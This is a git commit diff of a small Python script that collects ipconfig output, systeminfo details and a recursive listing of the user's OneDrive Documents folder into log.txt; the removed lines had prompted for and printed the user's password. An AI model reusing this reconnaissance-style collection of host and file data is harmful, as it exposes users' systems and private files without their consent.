557b50d7a06a93ddbf3ae2c8436993e0ab016d12
luis carlos annett lopez <papacalietesinaguacate@gmail.com>
2023-03-04 22:04:01 -0600

    logs the files in the docs folder

--- oliver.py
+++ oliver.py
@@ -1,12 +1,14 @@
-import subprocess,getpass
+import subprocess,getpass,os,glob
+# vars
+rootuser = getpass.getuser()
+rootdirectory = fr"C:\Users\{rootuser}"
 
+# to log
 ipconfig = subprocess.check_output("ipconfig").decode("utf-8")
 sysinfo = subprocess.check_output("systeminfo").decode("utf-8")
-user = getpass.getuser()
-password = getpass.getpass()
-print(user, password)
+docs = subprocess.check_output(fr"dir C:\Users\{rootuser}\OneDrive\Documentos /s").decode("utf-8")
 def loginfo(*val :object):
     with open("log.txt","w+") as f:
         for i in range(len(val)):
             f.write(val[i-1])
-loginfo(ipconfig, sysinfo)
+loginfo(ipconfig, sysinfo, docs)
